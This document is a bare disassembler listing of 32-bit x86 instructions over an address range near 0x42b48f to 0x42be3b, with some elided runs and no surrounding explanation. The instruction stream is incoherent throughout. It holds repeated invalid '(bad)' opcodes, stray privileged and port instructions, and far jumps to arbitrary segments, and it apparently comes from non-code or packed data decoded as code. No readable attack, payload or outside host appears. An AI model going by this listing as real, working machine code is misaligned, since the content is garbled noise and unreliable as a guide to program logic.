  42b48f:	inc    ecx
  42b490:	push   es
  42b491:	sub    BYTE PTR [edx+ebp*4+0x41238226],0x42
  42b499:	or     DWORD PTR [eax+0x6a],eax
  42b49c:	pop    eax
  42b49d:	test   DWORD PTR [ebx-0x7a],ebx
  42b4a0:	add    ah,ah
  42b4a2:	mov    dl,0xe5
  42b4a4:	mov    esi,esi
  42b4a6:	lock mov cl,0xb0
  42b4a9:	lds    ebp,FWORD PTR [esi+0x21]
  42b4ac:	outs   dx,BYTE PTR cs:[esi]
  42b4ae:	pushf  
  42b4af:	xchg   esp,eax
  42b4b0:	fs dec esp
  42b4b2:	inc    ecx
  42b4b3:	pop    eax
  42b4b4:	imul   BYTE PTR [edi+0x3a]
  42b4b7:	mov    cl,0xa3
  42b4b9:	in     eax,0xed
  42b4bb:	mov    dh,0x73
  42b4bd:	mov    ebp,0x9925c22
  42b4c2:	push   0xffffffa4
  42b4c4:	pop    eax
  42b4c5:	xor    esi,DWORD PTR ds:0xb6ec15c0
  42b4cb:	sti    
  42b4cc:	clc    
  42b4cd:	pushf  
  42b4ce:	adc    eax,0x54528590
  42b4d3:	jb     0x42b500
  42b4d5:	xlat   BYTE PTR ds:[ebx]
  42b4d6:	sbb    eax,0x9ddca3ef
  42b4db:	cli    
  42b4dc:	jns    0x42b544
  42b4de:	xor    eax,0x7968c23f
  42b4e3:	stc    
  42b4e4:	jo     0x42b4cf
  42b4e6:	fiadd  WORD PTR ds:[eax]
  42b4e9:	jmp    0xcc17b203
  42b4ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b4ef:	push   ecx
  42b4f0:	sbb    al,dh
  42b4f2:	add    BYTE PTR [ebp-0x13],cl
  42b4f5:	retf   0xe9be
  42b4f8:	pop    ds
  42b4f9:	dec    ebx
  42b4fa:	ret    0xed70
  42b4fd:	rcl    DWORD PTR [ebp+0x5520ffbe],0x12
  42b504:	les    esi,FWORD PTR [ecx]
  42b506:	or     DWORD PTR [esi],ebx
  42b508:	jne    0x42b56b
  42b50a:	add    al,0xd
  42b50c:	std    
  42b50d:	inc    ebp
  42b50e:	pop    esp
  42b50f:	sub    edx,esp
  42b511:	repz sub ah,ah
  42b514:	push   es
  42b515:	sbb    bl,cl
  42b517:	jo     0x42b4b8
  42b519:	bound  esi,QWORD PTR [esi]
  42b51b:	mov    cl,BYTE PTR [eax+eax*8+0x6061f6c3]
  42b522:	hlt    
  42b523:	or     eax,0xf7431432
  42b528:	js     0x42b528
  42b52a:	pop    ebp
  42b52b:	lods   eax,DWORD PTR ds:[esi]
  42b52c:	mov    bh,0xd7
  42b52e:	(bad)  
  42b52f:	fld    QWORD PTR [esi+0x709c7a6]
  42b535:	das    
  42b536:	and    DWORD PTR [eax],edx
  42b538:	aad    0xbc
  42b53a:	push   ds
  42b53b:	fst    DWORD PTR [ecx+ebp*2]
  42b53e:	scas   eax,DWORD PTR es:[edi]
  42b53f:	mov    cl,0x70
  42b541:	pop    edx
  42b542:	sub    DWORD PTR [esi+edx*2],0x627e5551
  42b549:	adc    DWORD PTR [esi+eiz*8-0x61],ebp
  42b54d:	jne    0x42b4d2
  42b54f:	lods   eax,DWORD PTR ds:[esi]
  42b550:	inc    esi
  42b551:	bound  ecx,QWORD PTR [ecx-0x69c1f6bb]
  42b557:	adc    ah,BYTE PTR [eax-0x51]
  42b55a:	cmp    DWORD PTR [ebx-0xa],esi
  42b55d:	jmp    0x28030f56
  42b562:	adc    dh,BYTE PTR [eax+ebx*2]
  42b565:	adc    DWORD PTR [edx+0x3eacf3d8],edx
  42b56b:	push   eax
  42b56c:	pop    edi
  42b56d:	pop    ebp
  42b56e:	xchg   BYTE PTR [edi-0x3a31dedb],ah
  42b574:	icebp  
  42b575:	jb     0x42b5b3
  42b577:	retf   
  42b578:	std    
  42b579:	in     al,dx
  42b57a:	add    DWORD PTR [edi-0xfd92a93],0xffffffff
  42b581:	test   al,0xc1
  42b583:	jp     0x42b589
  42b585:	shl    esi,cl
  42b587:	mov    dh,0x52
  42b589:	mov    bh,0x22
  42b58b:	xlat   BYTE PTR ds:[ebx]
  42b58c:	inc    edi
  42b58d:	cwde   
  42b58e:	pusha  
  42b58f:	mov    ecx,0x0
	...
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b601:	into   
  42b602:	adc    DWORD PTR [edi+0x1cfc4],0x104
  42b60c:	call   0x44d7:0x85170eb
  42b613:	cwde   
  42b614:	out    0xc4,al
  42b616:	mov    BYTE PTR [edi-0x2d521292],dh
  42b61c:	or     bh,BYTE PTR [esi-0x53]
  42b61f:	inc    edx
  42b620:	ins    DWORD PTR es:[edi],dx
  42b621:	ins    BYTE PTR es:[edi],dx
  42b622:	jnp    0x42b659
  42b624:	data16 js 0x42b602
  42b627:	stos   BYTE PTR es:[edi],al
  42b628:	add    al,0xd7
  42b62a:	je     0x42b5e5
  42b62c:	repnz inc ecx
  42b62e:	or     al,0xf
  42b630:	shr    ebp,cl
  42b632:	mov    ah,0x3f
  42b634:	jle    0x42b6b4
  42b636:	fld    st(2)
  42b638:	fld    QWORD PTR [eax]
  42b63a:	and    al,BYTE PTR [eax+0x51]
  42b63d:	add    BYTE PTR [esi-0x9],dl
  42b640:	inc    esi
  42b641:	repnz shr DWORD PTR [ebx],0x8b
  42b645:	pop    esi
  42b646:	push   edx
  42b647:	jmp    0x4c8bbb64
  42b64c:	mul    DWORD PTR [ecx+0x44]
  42b64f:	xor    DWORD PTR [ecx-0x7daae94b],esi
  42b655:	push   edi
  42b656:	cmp    bh,dh
  42b658:	sbb    DWORD PTR [edi],ecx
  42b65a:	inc    ebx
  42b65b:	and    BYTE PTR [eax+0x5b],cl
  42b65e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b65f:	jae    0x42b662
  42b661:	or     edx,edx
  42b663:	shl    BYTE PTR [ebp-0x18],cl
  42b666:	outs   dx,DWORD PTR ds:[esi]
  42b667:	imul   esp,DWORD PTR [esi+0x43],0xc120229a
  42b66e:	mov    DWORD PTR [eax+0x64],ecx
  42b671:	fsubp  st(5),st
  42b673:	sbb    eax,ebp
  42b675:	cwde   
  42b676:	inc    edx
  42b677:	adc    eax,0x6c0e5e03
  42b67c:	pop    esi
  42b67d:	add    bl,BYTE PTR [edx]
  42b67f:	ror    dh,1
  42b681:	sub    bl,ch
  42b683:	fadd   DWORD PTR [ecx+0x5cd4adfa]
  42b689:	cli    
  42b68a:	pop    esp
  42b68b:	inc    ecx
  42b68c:	mov    ecx,0xe496c935
  42b691:	fist   DWORD PTR [ebp-0x33]
  42b694:	test   DWORD PTR es:[ebp+0x4d5a2af7],ecx
  42b69b:	adc    DWORD PTR [ebp+eiz*8+0x726bf3ce],ecx
  42b6a2:	sar    edi,0xdf
  42b6a5:	aas    
  42b6a6:	out    0xd,al
  42b6a8:	push   edi
  42b6a9:	jns    0x42b713
  42b6ab:	add    eax,0xef760d59
  42b6b0:	or     DWORD PTR [ecx+0x37],ecx
  42b6b3:	sbb    edi,DWORD PTR [esi-0x7eadb94b]
  42b6b9:	jns    0x42b6f1
  42b6bb:	cmp    eax,0xba888b3b
  42b6c0:	dec    edx
  42b6c1:	cmp    edx,DWORD PTR [edi+0x27bb02b4]
  42b6c7:	pushf  
  42b6c8:	xor    dl,ah
  42b6ca:	sti    
  42b6cb:	test   DWORD PTR [eax-0x589f6e92],esp
  42b6d1:	outs   dx,BYTE PTR ds:[esi]
  42b6d2:	xlat   BYTE PTR ds:[ebx]
  42b6d3:	and    ecx,DWORD PTR [eax]
  42b6d5:	imul   ecx,ecx,0xffffffad
  42b6d8:	add    eax,0xd5c4cc4f
  42b6dd:	push   edi
  42b6de:	psadbw mm4,QWORD PTR [ebp-0x7ebc5878]
  42b6e5:	and    eax,0x606aef40
  42b6ea:	adc    BYTE PTR [esp+eiz*2-0x40fbeeab],cl
  42b6f1:	add    BYTE PTR [edx],0x78
  42b6f4:	jo     0x42b6fa
  42b6f6:	xlat   BYTE PTR ds:[ebx]
  42b6f7:	into   
  42b6f8:	cdq    
  42b6f9:	dec    ecx
  42b6fa:	icebp  
  42b6fb:	xlat   BYTE PTR ds:[ebx]
  42b6fc:	dec    ecx
  42b6fd:	or     esp,DWORD PTR fs:[esi]
  42b700:	adc    cl,BYTE PTR [esi+0x17]
  42b703:	jge    0x42b6e0
  42b705:	add    DWORD PTR [edx-0x2f4a7413],edi
  42b70b:	adc    DWORD PTR [esi],ecx
  42b70d:	mov    cl,0x73
  42b70f:	call   0x42b714
	...
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	dec    edi
  42b781:	les    edx,FWORD PTR [ecx+0x7a]
  42b784:	enter  0x1d0,0x0
  42b788:	add    al,0x1
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	dec    edi
  42b78d:	mov    ecx,0x9e3eefac
  42b792:	(bad)  
  42b793:	das    
  42b794:	inc    ecx
  42b795:	ins    DWORD PTR es:[edi],dx
  42b796:	scas   eax,DWORD PTR es:[edi]
  42b797:	pop    edi
  42b798:	std    
  42b799:	push   esi
  42b79a:	mov    ds:0x6e42f758,eax
  42b79f:	mov    bl,0x7e
  42b7a1:	jp     0x42b731
  42b7a3:	jp     0x42b765
  42b7a5:	aas    
  42b7a6:	mov    al,ds:0x31f4b540
  42b7ab:	sbb    al,0xe
  42b7ad:	xor    al,0xdb
  42b7af:	inc    ebx
  42b7b0:	sbb    ebx,DWORD PTR [ecx+esi*2+0x44]
  42b7b4:	inc    ecx
  42b7b5:	mov    ds:0xf7a6183f,eax
  42b7ba:	dec    esp
  42b7bb:	inc    eax
  42b7bc:	bound  ebx,QWORD PTR [esi-0x13]
  42b7bf:	test   eax,0xec932af
  42b7c4:	hlt    
  42b7c5:	xchg   edx,eax
  42b7c6:	xlat   BYTE PTR ds:[ebx]
  42b7c7:	sbb    eax,0x77525a09
  42b7cc:	cmp    eax,edi
  42b7ce:	lds    esi,FWORD PTR [eax]
  42b7d0:	mov    ebx,0x3605f2c3
  42b7d5:	jmp    0x4146:0xb1ed36b8
  42b7dc:	push   ds
  42b7dd:	test   ch,ch
  42b7df:	out    0xe2,al
  42b7e1:	sbb    al,0xf2
  42b7e3:	outs   dx,BYTE PTR ds:[esi]
  42b7e4:	sub    ah,bh
  42b7e6:	cld    
  42b7e7:	(bad)  
  42b7e8:	in     eax,dx
  42b7e9:	aam    0x86
  42b7eb:	lds    ebx,FWORD PTR [ebp+0x27ac6732]
  42b7f1:	fiadd  DWORD PTR [edi-0x4aae967a]
  42b7f7:	test   al,0x15
  42b7f9:	dec    ebp
  42b7fa:	in     eax,0x52
  42b7fc:	xor    BYTE PTR [eax+eiz*8+0x7f],ah
  42b800:	cmp    dl,al
  42b802:	dec    ebp
  42b803:	ja     0x42b7ae
  42b805:	push   esp
  42b806:	and    al,0xa0
  42b808:	xchg   edx,eax
  42b809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b80a:	dec    esp
  42b80b:	sbb    cl,BYTE PTR [ecx+0x3018ab01]
  42b811:	mov    DWORD PTR [ecx+0x495f9371],ebp
  42b817:	lods   al,BYTE PTR ds:[esi]
  42b818:	ds mov esp,0xc408a550
  42b81e:	xor    ebx,edx
  42b820:	aaa    
  42b821:	retf   
  42b822:	mov    bh,dl
  42b824:	adc    al,0x78
  42b826:	fucomp st(0)
  42b828:	push   ebp
  42b829:	js     0x42b80b
  42b82b:	xor    al,0x6b
  42b82d:	jns    0x42b881
  42b82f:	pushf  
  42b830:	xor    al,0x2b
  42b832:	in     al,0xfb
  42b834:	sub    eax,0x9a61d4b7
  42b839:	and    bl,ah
  42b83b:	pop    ebp
  42b83c:	shl    ch,0x28
  42b83f:	xor    eax,0x1466ec16
  42b844:	xor    BYTE PTR [ebp-0xe],al
  42b847:	(bad)  [ebx+0x43]
  42b84a:	les    ebp,FWORD PTR [edx-0x73]
  42b84d:	cmp    ch,BYTE PTR [ebp+eax*2-0x64845ffc]
  42b854:	loop   0x42b869
  42b856:	(bad)
  42b85a:	or     cl,BYTE PTR [ecx]
  42b85c:	cmp    eax,0x1f08405f
  42b861:	adc    esp,edi
  42b863:	lods   al,BYTE PTR ds:[esi]
  42b864:	and    eax,0xe366bf13
  42b869:	mov    ds:0xb2fecf61,al
  42b86e:	je     0x42b827
  42b870:	ds dec esp
  42b872:	icebp  
  42b873:	sub    eax,0xc928b346
  42b878:	repnz rcr cl,1
  42b87b:	xor    eax,0x90f5eb1b
  42b880:	jno    0x42b857
  42b882:	push   ds
  42b883:	mov    dh,0x35
  42b885:	lahf   
  42b886:	(bad)  
  42b887:	hlt    
  42b888:	cpuid  
  42b88a:	push   eax
  42b88b:	pop    ds
  42b88c:	jb     0x42b8f5
  42b88e:	jp     0x42b8d3
	...
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ecx,DWORD PTR [ebx]
  42b901:	cmp    al,0x45
  42b903:	into   
  42b904:	int3   
  42b905:	rol    DWORD PTR [ecx],1
  42b907:	add    BYTE PTR [ecx+eax*1],al
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	out    0xcb,eax
  42b90e:	adc    BYTE PTR [ebp+0x24ad21b6],al
  42b914:	icebp  
  42b915:	pop    edx
  42b916:	cdq    
  42b917:	repnz xlat BYTE PTR ds:[ebx]
  42b919:	std    
  42b91a:	lock and BYTE PTR [ecx-0x35],0xc3
  42b91f:	jge    0x42b8b2
  42b921:	ja     0x42b942
  42b923:	imul   esi,DWORD PTR [edx],0x28
  42b926:	das    
  42b927:	adc    DWORD PTR [eax],eax
  42b929:	(bad)
  42b92c:	out    dx,eax
  42b92d:	shl    DWORD PTR [ebp+0x2ce9f473],1
  42b933:	mov    ebp,0x5e4c386b
  42b938:	or     eax,0xb480fbe3
  42b93d:	fdivr  st,st(5)
  42b93f:	clc    
  42b940:	shl    BYTE PTR [ecx+0x1a4a87a3],1
  42b946:	push   ebp
  42b947:	outs   dx,DWORD PTR ds:[esi]
  42b948:	add    BYTE PTR [edi+0x4e1c9aea],ch
  42b94e:	sub    bh,BYTE PTR [edi]
  42b950:	sub    al,0x19
  42b952:	jo     0x42b929
  42b954:	inc    edi
  42b955:	jecxz  0x42b918
  42b957:	adc    edx,ebx
  42b959:	sbb    ecx,edx
  42b95b:	mov    ebx,0xad79292f
  42b960:	add    BYTE PTR [edx-0x7e5508e1],al
  42b966:	xchg   bh,dh
  42b968:	mov    al,ds:0xf7c94343
  42b96d:	retf   0x3330
  42b970:	inc    edi
  42b971:	sub    DWORD PTR [ecx-0x64],0x13
  42b975:	shl    BYTE PTR cs:[ebx+0x24c777ac],1
  42b97c:	shl    DWORD PTR [edi+edx*8],0x90
  42b980:	sub    eax,0x6e4d3493
  42b985:	frstor [ecx]
  42b987:	jmp    0x4cb8:0xce58421c
  42b98e:	pop    es
  42b98f:	inc    ebx
  42b990:	inc    ebx
  42b991:	and    BYTE PTR [ecx-0x1dc30286],al
  42b997:	mov    bh,0x4
  42b999:	pop    ebx
  42b99a:	arpl   WORD PTR [eax],sp
  42b99c:	push   esp
  42b99d:	fld    st(6)
  42b99f:	and    ebp,ecx
  42b9a1:	inc    edx
  42b9a2:	sub    BYTE PTR [eax],al
  42b9a4:	push   eax
  42b9a5:	fucom  st(7)
  42b9a7:	sahf   
  42b9a8:	mov    esp,DWORD PTR [ecx+edi*1+0x72]
  42b9ac:	mov    dl,0x2b
  42b9ae:	and    dh,dh
  42b9b0:	dec    esp
  42b9b1:	mov    BYTE PTR [edx+0x29],dl
  42b9b4:	adc    eax,0xb8aed524
  42b9b9:	js     0x42b9b8
  42b9bb:	ins    DWORD PTR es:[edi],dx
  42b9bc:	sbb    ch,BYTE PTR [edi-0x32983c21]
  42b9c2:	and    BYTE PTR [edx],bh
  42b9c4:	pop    esp
  42b9c5:	push   edi
  42b9c6:	into   
  42b9c7:	pop    esi
  42b9c8:	or     eax,0x8a9e3562
  42b9cd:	add    edx,ecx
  42b9cf:	fwait
  42b9d0:	mov    al,0x10
  42b9d2:	adc    eax,0xfffffff4
  42b9d5:	pop    ds
  42b9d6:	out    dx,al
  42b9d7:	icebp  
  42b9d8:	dec    esp
  42b9d9:	loope  0x42b971
  42b9db:	pop    es
  42b9dc:	mov    dh,0xb5
  42b9de:	inc    esp
  42b9df:	icebp  
  42b9e0:	daa    
  42b9e1:	pop    eax
  42b9e2:	jp     0x42ba38
  42b9e4:	xor    eax,0x240f4d57
  42b9e9:	jmp    0x5ff2b722
  42b9ee:	test   al,0x67
  42b9f0:	push   eax
  42b9f1:	or     eax,0x7ad2aef4
  42b9f6:	add    eax,0xfb1a5054
  42b9fb:	dec    edx
  42b9fc:	mov    edx,0xc89f04e0
  42ba01:	imul   ebp,DWORD PTR [esi-0x4da1fa59],0xffffff82
  42ba08:	(bad)  
  42ba09:	sbb    ebx,DWORD PTR [esi-0x3b]
  42ba0c:	stos   DWORD PTR es:[edi],eax
  42ba0d:	xor    DWORD PTR [esi+edi*4+0x0],eax
	...
  42ba74:	mov    eax,DWORD PTR [edi]
  42ba76:	mov    al,0xe2
  42ba78:	mov    esp,0x6a6fdbf7
  42ba7d:	pop    ebx
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [ebx-0x2fbd3f18],ecx
  42ba85:	rol    BYTE PTR [ecx],cl
  42ba87:	add    BYTE PTR [ecx+eax*1],al
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	mov    bl,0xfd
  42ba8e:	out    0x19,eax
  42ba90:	aaa    
  42ba91:	out    0xae,al
  42ba93:	out    dx,eax
  42ba94:	xchg   DWORD PTR [eax],ecx
  42ba96:	call   0xdb3808c4
  42ba9b:	sar    BYTE PTR [edi],cl
  42ba9d:	mov    WORD PTR [esi],?
  42ba9f:	into   
  42baa0:	inc    esp
  42baa1:	push   ecx
  42baa2:	loop   0x42ba4c
  42baa4:	add    BYTE PTR [edi],bh
  42baa6:	scas   al,BYTE PTR es:[edi]
  42baa7:	rcl    BYTE PTR [ebx],0xb8
  42baaa:	nop
  42baab:	xchg   ebx,eax
  42baac:	out    0x52,al
  42baae:	call   0x1361:0x47f10d6
  42bab5:	add    edx,esp
  42bab7:	inc    ecx
  42bab8:	cmp    BYTE PTR [eax+0x4b],ah
  42babb:	jnp    0x42ba6a
  42babd:	scas   al,BYTE PTR es:[edi]
  42babe:	rol    edx,1
  42bac0:	xor    eax,0xc18c2bea
  42bac5:	gs or  eax,0xdaec8e62
  42bacb:	or     ebx,DWORD PTR [ebp+0x31f724c]
  42bad1:	mov    dl,0x6e
  42bad3:	pushf  
  42bad4:	and    eax,0x6df31572
  42bad9:	lods   al,BYTE PTR ds:[esi]
  42bada:	sub    BYTE PTR [ebx],0x8e
  42badd:	mov    cl,0xb0
  42badf:	outs   dx,DWORD PTR ds:[esi]
  42bae0:	adc    BYTE PTR ds:0x96e0ff38,dl
  42bae6:	cmp    DWORD PTR [edi+0x2e],eax
  42bae9:	pop    ss
  42baea:	push   ss
  42baeb:	std    
  42baec:	pusha  
  42baed:	nop
  42baee:	and    DWORD PTR [ecx+0x39],0xffffff9e
  42baf2:	repz pusha 
  42baf4:	(bad)  
  42baf6:	(bad)  
  42baf7:	mov    ch,0xf0
  42baf9:	cmp    DWORD PTR [edx-0x123f86c],0xbc105b38
  42bb03:	cdq    
  42bb04:	aaa    
  42bb05:	or     eax,0xc28c8e8
  42bb0a:	lods   eax,DWORD PTR ds:[esi]
  42bb0b:	jp     0x42bb70
  42bb0d:	js     0x42baed
  42bb0f:	aas    
  42bb10:	or     BYTE PTR [eax-0x62387418],ch
  42bb16:	pop    ss
  42bb17:	test   DWORD PTR [edi],ebx
  42bb19:	(bad)  
  42bb1a:	xchg   edi,eax
  42bb1b:	sbb    BYTE PTR [edx],ah
  42bb1d:	xchg   ebp,eax
  42bb1e:	xchg   BYTE PTR [esi-0x78],bh
  42bb21:	jg     0x42bb25
  42bb23:	fdiv   DWORD PTR [ecx]
  42bb25:	mov    eax,0x77247559
  42bb2a:	fwait
  42bb2b:	loop   0x42baf5
  42bb2d:	or     bl,BYTE PTR [esi-0x411f1e1d]
  42bb33:	push   ecx
  42bb34:	add    DWORD PTR [eax+0x6d98cb2e],0xc
  42bb3b:	jb     0x42bb02
  42bb3d:	xor    bh,BYTE PTR [edx]
  42bb3f:	mov    esi,0xb68468e0
  42bb44:	std    
  42bb45:	xor    eax,0x91da18f4
  42bb4a:	pop    eax
  42bb4b:	pop    ecx
  42bb4c:	sbb    dh,al
  42bb4e:	aas    
  42bb4f:	js     0x42badf
  42bb51:	push   0x2a6d4072
  42bb56:	push   cs
  42bb57:	outs   dx,BYTE PTR ds:[esi]
  42bb58:	jo     0x42baf9
  42bb5a:	or     esp,DWORD PTR [esi]
  42bb5c:	in     eax,dx
  42bb5d:	jge    0x42bb56
  42bb5f:	mov    esi,gs
  42bb61:	inc    esp
  42bb62:	pavgw  mm0,QWORD PTR [eax-0x31]
  42bb66:	push   eax
  42bb67:	push   esp
  42bb68:	cwde   
  42bb69:	dec    esp
  42bb6a:	pop    ebx
  42bb6b:	or     eax,0xed199d07
  42bb70:	xchg   edi,eax
  42bb71:	mov    bl,0x7
  42bb73:	inc    eax
  42bb74:	ret    0x39ca
  42bb77:	retf   0x3268
  42bb7a:	test   DWORD PTR [esi],eax
  42bb7c:	cdq    
  42bb7d:	mov    ecx,0x79710f1
  42bb82:	mov    dh,0xf9
  42bb84:	(bad)  
  42bb85:	(bad)  
  42bb87:	ja     0x42bb85
  42bb89:	sbb    eax,0x59f62cc4
  42bb8e:	fsubr  DWORD PTR [eax]
	...
  42bbf4:	xor    al,0x28
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	outs   dx,DWORD PTR ds:[esi]
  42bc01:	pop    ebp
  42bc02:	outs   dx,BYTE PTR ds:[esi]
  42bc03:	lock aam 0xd3
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    al,0x1
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	sbb    dl,BYTE PTR [ebx]
  42bc0e:	adc    al,0x90
  42bc10:	sub    al,BYTE PTR [edx]
  42bc12:	popa   
  42bc13:	mov    esp,0x899f8437
  42bc18:	jmp    0xa611251c
  42bc1d:	imul   ebp,DWORD PTR [edx+0x11a1835d],0xffffff8c
  42bc24:	jno    0x42bbc8
  42bc26:	mov    ch,0xb5
  42bc28:	gs loopne 0x42bca0
  42bc2b:	dec    esi
  42bc2c:	mov    ch,0x24
  42bc2e:	ja     0x42bc4b
  42bc30:	sub    edi,DWORD PTR [eax+0x61]
  42bc33:	push   eax
  42bc34:	in     al,dx
  42bc35:	cmp    esi,ebp
  42bc37:	(bad)  
  42bc38:	mov    al,0xfb
  42bc3a:	fwait
  42bc3b:	jnp    0x42bbf5
  42bc3d:	push   edx
  42bc3e:	arpl   WORD PTR [edx+0x53],bx
  42bc41:	inc    edi
  42bc42:	jmp    0x790b052f
  42bc47:	cli    
  42bc48:	adc    eax,0x6e8b794d
  42bc4d:	mov    al,ds:0xaa83bcf
  42bc52:	sbb    al,0x99
  42bc54:	jne    0x42bc73
  42bc56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc57:	pusha  
  42bc58:	fidivr DWORD PTR [esi-0x7f]
  42bc5b:	in     eax,dx
  42bc5c:	fidiv  WORD PTR [ecx-0xf]
  42bc5f:	icebp  
  42bc60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc61:	mov    BYTE PTR ds:0xa67ec742,dh
  42bc67:	sub    eax,0xf34dbac1
  42bc6c:	clc    
  42bc6d:	fadd   DWORD PTR [esp+ecx*1-0x6ba0aa78]
  42bc74:	xchg   esp,eax
  42bc75:	cmp    al,0xd4
  42bc77:	cmp    bh,BYTE PTR [eax-0x2e33a09d]
  42bc7d:	je     0x42bc22
  42bc7f:	mov    eax,ds:0xbac6aa79
  42bc84:	cs mov esp,0xb3bd7055
  42bc8a:	or     DWORD PTR [eax],esi
  42bc8c:	nop
  42bc8d:	push   ebx
  42bc8e:	cdq    
  42bc8f:	sbb    DWORD PTR [esi],ebx
  42bc91:	pop    esi
  42bc92:	jp     0x42bc3c
  42bc94:	add    BYTE PTR [eax],dh
  42bc96:	xor    BYTE PTR [edi+0x49054a73],0x55
  42bc9d:	(bad)  
  42bc9e:	add    al,0x0
  42bca0:	push   edx
  42bca1:	ins    DWORD PTR es:[edi],dx
  42bca2:	sahf   
  42bca3:	add    edx,edi
  42bca5:	adc    ch,ah
  42bca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bca8:	mov    eax,0xeea0e134
  42bcad:	dec    edx
  42bcae:	xor    ebp,ebp
  42bcb0:	hlt    
  42bcb1:	jmp    0xc093:0xb97c1025
  42bcb8:	adc    dl,BYTE PTR [edx-0x1e]
  42bcbb:	out    dx,al
  42bcbc:	fldenv [edx-0x1155f5c]
  42bcc2:	inc    ecx
  42bcc3:	add    eax,0x64ccc80
  42bcc8:	call   0xfa24203e
  42bccd:	mov    ch,0x38
  42bccf:	arpl   WORD PTR [esi+0x48],bx
  42bcd2:	pushf  
  42bcd3:	mov    ecx,0x3cfb7095
  42bcd8:	sbb    eax,0xb892d640
  42bcdd:	or     DWORD PTR [ebp+0x6a62b75c],eax
  42bce3:	shr    DWORD PTR [eax+0x3],0x6e
  42bce7:	mov    esp,0x7722fde7
  42bcec:	imul   ebx,DWORD PTR [edi],0x57e1857c
  42bcf2:	push   es
  42bcf3:	test   DWORD PTR [esi+0x50],edi
  42bcf6:	ror    DWORD PTR [eax+0x82c518c],cl
  42bcfc:	mov    cl,0xb9
  42bcfe:	fmul   QWORD PTR [ebx]
  42bd00:	mov    cl,0x8
  42bd02:	pop    ss
  42bd03:	xor    BYTE PTR [ebx],dh
  42bd05:	pop    edi
  42bd06:	rcl    DWORD PTR [edi],1
  42bd08:	push   ebp
  42bd09:	mov    ecx,0x1f16d4a9
  42bd0e:	mov    ch,0x2b
	...
  42bd74:	mov    al,0xb6
  42bd76:	pushf  
  42bd77:	adc    al,0x9e
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd38
  42bd81:	or     edi,edi
  42bd83:	xor    bl,al
  42bd85:	aam    0x1
  42bd87:	add    BYTE PTR [ecx+eax*1],al
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	imul   BYTE PTR [ecx-0x7c]
  42bd8f:	mov    ds:0x44ffcd41,al
  42bd94:	imul   edx,DWORD PTR [ecx+0x70],0x17
  42bd98:	sub    ebx,DWORD PTR [esi-0x5f]
  42bd9b:	push   esi
  42bd9c:	pop    ecx
  42bd9d:	jmp    0xbe7:0xba4c81c2
  42bda4:	mov    bl,0x72
  42bda6:	dec    eax
  42bda7:	mov    ebp,0x5d866c06
  42bdac:	dec    edi
  42bdad:	xchg   esp,eax
  42bdae:	cdq    
  42bdaf:	jbe    0x42bd71
  42bdb1:	fidiv  WORD PTR [ecx-0x1e249a3f]
  42bdb7:	cmp    al,0xda
  42bdb9:	neg    DWORD PTR [edi-0xf]
  42bdbc:	push   eax
  42bdbd:	sbb    al,0x1
  42bdbf:	(bad)  
  42bdc0:	retf   0x376e
  42bdc3:	xchg   esp,eax
  42bdc4:	mov    esp,0xdc9f8591
  42bdc9:	inc    ebp
  42bdca:	lea    edi,[esp+edx*8-0x6342bcd6]
  42bdd1:	imul   DWORD PTR [eax+ebx*4]
  42bdd4:	lods   al,BYTE PTR ds:[esi]
  42bdd5:	das    
  42bdd6:	loope  0x42bda7
  42bdd8:	adc    eax,DWORD PTR [eax]
  42bdda:	iret   
  42bddb:	aad    0xa6
  42bddd:	sahf   
  42bdde:	xchg   ebx,eax
  42bddf:	sbb    DWORD PTR [eax+eax*8],ebp
  42bde2:	cs loop 0x42be28
  42bde5:	fisubr WORD PTR [esi]
  42bde7:	pop    ds
  42bde8:	mov    eax,0x797cf062
  42bded:	pop    eax
  42bdee:	adc    eax,0x86183be1
  42bdf3:	cs cwde 
  42bdf5:	pop    ds
  42bdf6:	out    0x27,al
  42bdf8:	or     BYTE PTR [eax+0x46],ah
  42bdfb:	pop    edi
  42bdfc:	push   cs
  42bdfd:	dec    ebx
  42bdfe:	leave  
  42bdff:	fucomi st,st(2)
  42be01:	(bad)  
  42be03:	xchg   esp,eax
  42be04:	je     0x42bda4
  42be06:	pop    ds
  42be07:	sub    al,0xa9
  42be09:	mov    eax,ds:0x62ce6cc3
  42be0e:	mov    eax,ds:0x94c0a975
  42be13:	ficom  DWORD PTR ds:0x4f806018
  42be19:	pop    eax
  42be1a:	icebp  
  42be1b:	lods   al,BYTE PTR ds:[esi]
  42be1c:	cli    
  42be1d:	fld    DWORD PTR [eax+0x20296eb0]
  42be23:	(bad)  
  42be25:	fsub   DWORD PTR [edx-0x2c]
  42be28:	sbb    eax,0x78d61170
  42be2d:	sbb    dl,BYTE PTR [edx]
  42be2f:	and    ecx,DWORD PTR [ebx]
  42be31:	pushf  
  42be32:	into   
  42be33:	pop    edi
  42be34:	mov    eax,ds:0xbe12c51d
  42be39:	cmp    esi,edi
  42be3b:	mov    ss,WORD PTR [ecx]
